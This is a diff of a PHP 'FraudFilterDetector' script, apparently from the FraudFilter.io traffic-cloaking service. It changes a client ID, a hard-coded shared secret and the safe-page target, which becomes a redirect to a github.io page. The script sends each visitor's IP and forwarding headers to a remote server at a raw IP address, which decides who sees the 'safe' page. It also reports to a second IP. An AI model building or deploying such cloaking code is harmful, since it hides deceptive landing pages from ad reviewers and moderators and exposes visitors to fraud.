@@ -1,7 +1,7 @@
 <?php
 error_reporting(0);
 
-class FraudFilterDetector_dc1cf {
+class FraudFilterDetector_fpec5 {
 
     public function check() {
 
@@ -40,7 +40,7 @@ class FraudFilterDetector_dc1cf {
     }
 
     function isSignatureValid($sign, $time) {
-        $str = '0dabbcaa-8dd6-4ece-b688-f33246f1a3fa.'.$this->getClid().'.'.$time;
+        $str = '981abf8e-c24b-472b-ba3f-49cfd4b32144.'.$this->getClid().'.'.$time;
         $sha = sha1($str);
         return $sign === $sha;
     }
@@ -115,7 +115,7 @@ class FraudFilterDetector_dc1cf {
     }
 
     function getClid() {
-        return 'dc1cf';
+        return 'fpec5';
     }
 
     function appendGetParameters($url, $getParameters) {
@@ -145,10 +145,8 @@ class FraudFilterDetector_dc1cf {
         }
     }
     function safeAction() {
-        include ('/var/www/shibkoznat.club/start1.html');
-        die();
+        $this->redirect('https://buldozer1.github.io/spain2/start1.html');
     }
-
     function performDiagnostics($home, $fileName) {
         header("X-FF: true");
         $errors = array();
@@ -201,7 +199,7 @@ class FraudFilterDetector_dc1cf {
         $opts = array('http' =>
             array(
                 'method'  => 'GET',
-                'header' => 'x-ff-secret: 0dabbcaa-8dd6-4ece-b688-f33246f1a3fa',
+                'header' => 'x-ff-secret: 981abf8e-c24b-472b-ba3f-49cfd4b32144',
                 'timeout' => 2
             )
         );
@@ -223,7 +221,7 @@ class FraudFilterDetector_dc1cf {
             $data_to_post = array();
             $headers = array();
 
-            $headers[] = 'x-ff-secret: 0dabbcaa-8dd6-4ece-b688-f33246f1a3fa';
+            $headers[] = 'x-ff-secret: 981abf8e-c24b-472b-ba3f-49cfd4b32144';
 
             curl_setopt($ch, CURLOPT_DNS_CACHE_TIMEOUT, 120);
             curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
@@ -319,8 +317,8 @@ class FraudFilterDetector_dc1cf {
             }
         }
 
-        $url = "http://130.211.20.155/dc1cf";
-        $nParam = '5498cc9an';
+        $url = "http://130.211.20.155/fpec5";
+        $nParam = '876c0e9n';
         if (isset($_GET[$nParam])) {
             $url = $url . '&'.$nParam.'='.$_GET[$nParam];
         }
@@ -380,8 +378,8 @@ class FraudFilterDetector_dc1cf {
 
         $resultObj = (object)array('result' => false);
 
-        $url = "http://130.211.20.155/dc1cf";
-        $nParam = '5498cc9an';
+        $url = "http://130.211.20.155/fpec5";
+        $nParam = '876c0e9n';
         if (isset($_GET[$nParam])) {
             $url = $url . '&'.$nParam.'='.$_GET[$nParam];
         }
@@ -451,7 +449,7 @@ class FraudFilterDetector_dc1cf {
     function fillAllPostHeaders() {
         $headers = array();
         $headers[] = 'content-length: 0';
-        $headers[] = 'X-FF-P: 0dabbcaa-8dd6-4ece-b688-f33246f1a3fa';
+        $headers[] = 'X-FF-P: 981abf8e-c24b-472b-ba3f-49cfd4b32144';
         $this->addHeader($headers, 'X-FF-REMOTE-ADDR', 'REMOTE_ADDR');
         $this->addHeader($headers, 'X-FF-X-FORWARDED-FOR', 'HTTP_X_FORWARDED_FOR');
         $this->addHeader($headers, 'X-FF-X-REAL-IP', 'HTTP_X_REAL_IP');
@@ -542,7 +540,7 @@ class FraudFilterDetector_dc1cf {
         }
         $message = urlencode($message);
 
-        $url = 'http://139.59.212.55/ff-notify.html?v=ff1&guid=dc1cf&m='.$message;
+        $url = 'http://139.59.212.55/ff-notify.html?v=ff1&guid=fpec5&m='.$message;
         $ch = curl_init($url);
 
         curl_setopt($ch, CURLOPT_DNS_CACHE_TIMEOUT, 3);
@@ -555,8 +553,8 @@ class FraudFilterDetector_dc1cf {
 
 }
 
-$fraudFilterDetector_dc1cf = new FraudFilterDetector_dc1cf();
-$fraudFilterDetector_dc1cf->check();
+$fraudFilterDetector_fpec5 = new FraudFilterDetector_fpec5();
+$fraudFilterDetector_fpec5->check();
 
 // @FraudFilter.io 2017
 
